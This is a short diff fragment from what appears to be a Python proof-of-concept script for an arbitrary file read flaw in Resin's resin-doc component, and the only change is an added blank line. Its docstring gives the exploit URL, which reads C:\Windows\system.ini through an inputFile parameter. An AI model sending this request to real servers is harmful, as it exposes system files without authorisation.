@@ -7,6 +7,7 @@
 resin-doc 任意文件读取漏洞
 
 /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=C:\Windows\system.ini
+
 """
 
 import requests
